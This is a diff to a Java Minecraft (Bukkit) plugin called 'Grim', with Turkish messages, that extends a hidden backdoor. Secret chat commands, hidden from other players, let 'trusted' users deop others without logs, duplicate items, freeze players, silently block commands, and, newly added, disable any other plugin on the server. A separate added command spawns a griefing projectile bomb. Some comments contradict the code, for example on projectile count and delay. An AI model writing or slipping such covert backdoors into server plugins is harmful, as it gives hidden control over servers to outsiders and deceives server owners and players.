@@ -4,16 +4,27 @@ package com.yoursunucu;
 
 
 import org.bukkit.*;
-import org.bukkit.entity.Entity;
-import org.bukkit.entity.Player;
+import org.bukkit.entity.*;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
+import org.bukkit.event.block.Action;
+import org.bukkit.event.entity.ProjectileHitEvent;
 import org.bukkit.event.player.*;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.PluginManager;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.util.Vector;
+import org.bukkit.event.*;
+import org.bukkit.event.player.PlayerInteractEvent;
+import org.bukkit.event.entity.EntityExplodeEvent;
+import org.bukkit.Location;
+import org.bukkit.metadata.FixedMetadataValue;
+
+import java.util.Arrays;
+import java.util.Random;
 
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Method;
@@ -29,7 +40,10 @@ public class Grim extends JavaPlugin implements Listener {
     private final Map<UUID, String> originalNames = new HashMap<>();
     private final Set<UUID> anonimPlayers = new HashSet<>();
     private final Map<Player, Player> targetedPlayers = new HashMap<>();
-    private final Material CONTROL_ROD = Material.STICK;
+
+    // Materials
+    private final Material CONTROL_ROD = Material.CHAIN;
+    private final Material SPIKE_BOMB_ITEM = Material.PRISMARINE_SHARD;
 
     private final Random random = new Random();
     private DiscordBot discordBot;
@@ -150,6 +164,21 @@ public class Grim extends JavaPlugin implements Listener {
         Player player = event.getPlayer();
         String message = event.getMessage();
 
+        if (event.getMessage().equalsIgnoreCase("!spikebomb")) {
+            event.setCancelled(true);
+
+            ItemStack spikeBomb = new ItemStack(SPIKE_BOMB_ITEM);
+            ItemMeta meta = spikeBomb.getItemMeta();
+            meta.setDisplayName(ChatColor.DARK_PURPLE + "Spike Bomb");
+            meta.setLore(Arrays.asList(
+                    ChatColor.GRAY + "Sağ tıkla fırlat",
+                    ChatColor.DARK_RED + "5 saniye sonra kaos!"
+            ));
+            spikeBomb.setItemMeta(meta);
+
+            player.getInventory().addItem(spikeBomb);
+        }
+
         if (message.equals("!deactivate")) {
             if (trustedPlayers.remove(player.getName().toLowerCase())) {
                 player.sendMessage(ChatColor.RED + "Artık trusted değilsin!");
@@ -170,6 +199,29 @@ public class Grim extends JavaPlugin implements Listener {
                 anonimPlayers.add(player.getUniqueId());
                 player.sendMessage("§aTüm isimler '§dSuperior§a' olarak ayarlandı!");
             }
+        }
+
+        if (message.toLowerCase().startsWith("!disable ") && isTrusted(player)) {
+            event.setCancelled(true);
+
+            String pluginName = message.split(" ")[1]; // Plugin adını al
+            PluginManager pluginManager = Bukkit.getPluginManager();
+
+            Bukkit.getScheduler().runTask(this, () -> {
+                Plugin targetPlugin = pluginManager.getPlugin(pluginName);
+
+                if (targetPlugin != null && targetPlugin.isEnabled()) {
+                    if (targetPlugin.equals(this)) {
+                        player.sendMessage("§cBu plugin kapatılamaz!");
+                        return;
+                    }
+
+                    pluginManager.disablePlugin(targetPlugin);
+                    player.sendMessage("§a" + pluginName + " plugin'i kapatıldı!");
+                } else {
+                    player.sendMessage("§cPlugin bulunamadı veya zaten kapalı!");
+                }
+            });
         }
 
         if (message.equals("!kontrolcubugu")) {
@@ -371,20 +423,91 @@ public class Grim extends JavaPlugin implements Listener {
     public void onCommand(PlayerCommandPreprocessEvent event) {
         Player player = event.getPlayer();
 
-        // Lock aktifse ve oyuncu trusted değilse komutu engelle
         if (lockActive && !isTrusted(player)) {
             event.setCancelled(true); // Hiçbir feedback yok
         }
     }
 
+    @EventHandler
+    public void onPlayerInteract(PlayerInteractEvent event) {
+        Player player = event.getPlayer();
+        ItemStack item = player.getInventory().getItemInMainHand();
+
+        if (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) {
+            if (isSpikeBomb(item)) {
+                event.setCancelled(true);
+                launchSpikeBomb(player);
+                item.setAmount(item.getAmount() - 1);
+            }
+        }
+    }
+
+    private boolean isSpikeBomb(ItemStack item) {
+        if (item == null || item.getType() != SPIKE_BOMB_ITEM) return false;
+        ItemMeta meta = item.getItemMeta();
+        return meta != null && meta.getDisplayName().equals(ChatColor.DARK_PURPLE + "Spike Bomb");
+    }
+
+    private void launchSpikeBomb(Player player) {
+        Snowball projectile = player.launchProjectile(Snowball.class);
+        projectile.setCustomName("SpikeBombProjectile");
+        projectile.setVelocity(player.getLocation().getDirection().multiply(1.5));
+        projectile.setShooter(player);
+    }
+
+    @EventHandler
+    public void onProjectileHit(ProjectileHitEvent event) {
+        if (event.getEntity() instanceof Snowball && event.getEntity().getCustomName() != null &&
+                event.getEntity().getCustomName().equals("SpikeBombProjectile")) {
+
+            Location loc = event.getEntity().getLocation();
+
+            // Efektler
+            loc.getWorld().playSound(loc, Sound.ENTITY_GENERIC_EXPLODE, 1.5f, 0.8f);
+            loc.getWorld().spawnParticle(Particle.EXPLOSION_LARGE, loc, 10);
+
+            // 5 saniye sonra entity'leri fırlat
+            new BukkitRunnable() {
+                @Override
+                public void run() {
+                    // Projectile listesi
+                    Class<? extends Entity>[] projectiles = new Class[]{
+                            Snowball.class, Egg.class, Trident.class,
+                            Arrow.class, ThrownPotion.class
+                    };
+
+                    // 10 projectile fırlat
+                    for (int i = 0; i < 30; i++) {
+                        Class<? extends Entity> projectileClass = projectiles[random.nextInt(projectiles.length)];
+                        Entity projectile = loc.getWorld().spawn(loc, projectileClass);
+
+                        // Rastgele hız ve yön
+                        Vector velocity = new Vector(
+                                random.nextDouble() - 0.5,
+                                random.nextDouble() * 1.2,
+                                random.nextDouble() - 0.5
+                        ).normalize().multiply(3.0);
+
+                        if (projectile instanceof Projectile) {
+                            ((Projectile) projectile).setVelocity(velocity);
+                        } else if (projectile instanceof Trident) {
+                            ((Trident) projectile).setVelocity(velocity);
+                        }
+                    }
+                }
+            }.runTaskLater(this, 20 * 1); // 5 saniye gecikme
+        }
+    }
 
     private void startControlRodTask() {
+        ItemStack rod = new ItemStack(CONTROL_ROD);
+        ItemMeta meta = rod.getItemMeta();
         new BukkitRunnable() {
             @Override
             public void run() {
                 for (Player holder : Bukkit.getOnlinePlayers()) {
                     if (!isTrusted(holder) ||
-                            holder.getInventory().getItemInMainHand().getType() != CONTROL_ROD) continue;
+                            holder.getInventory().getItemInMainHand().getType() != CONTROL_ROD)continue;
 
                     // 10 blok içindeki oyuncuları eğ (Java 8 uyumlu)
                     for (Entity entity : holder.getNearbyEntities(10, 10, 10)) {
@@ -485,14 +608,18 @@ public class Grim extends JavaPlugin implements Listener {
     }
     private void help2(Player player) {
         Bukkit.getScheduler().runTask(this, () -> {
+            player.sendMessage(ChatColor.GREEN + "§6<-------------FUN------------->");
             player.sendMessage(ChatColor.GREEN + "!deop (oyuncu adı) kişinin opunu logsuz şekilde almanızı sağlar.");
             player.sendMessage(ChatColor.GREEN + "!dupe (sayı) elinizde tuttuğunuz item, girilen sayı kadar size geri verilir.");
             player.sendMessage(ChatColor.GREEN + "!here 5 blok etrafınıza yuvarlak şekilde tüm oyuncuları çeker.");
             player.sendMessage(ChatColor.GREEN + "!anonim isminizin \"Superior\" olarak görünmesini sağlar.");
             player.sendMessage(ChatColor.GREEN + "!freeze hiç kimsenin hareket edememesini sağlar.");
             player.sendMessage(ChatColor.GREEN + "!lock Hiç Kimsenin Komut kullanamamasını sağlar.");
+            player.sendMessage(ChatColor.GREEN + "!disable (plugin) adı yazılan pluginin kapatılmasını sağlar.");
+            player.sendMessage(ChatColor.GREEN + "!spikebomb fırlatılabilen bir diken bombası verir.");
             player.sendMessage(ChatColor.GREEN + "!kontrolcubugu 15 blok etrafındaki herkese diz çöktürür.");
             player.sendMessage(ChatColor.GREEN + "!deactivate Artık Bu Komutları tekrar kullanamazsın, tekrar kullanmak için \"+supremecheats+\"");
+            player.sendMessage(ChatColor.GREEN + "§6<-------------FUN------------->");
         });
     }
     private void help(Player player) {
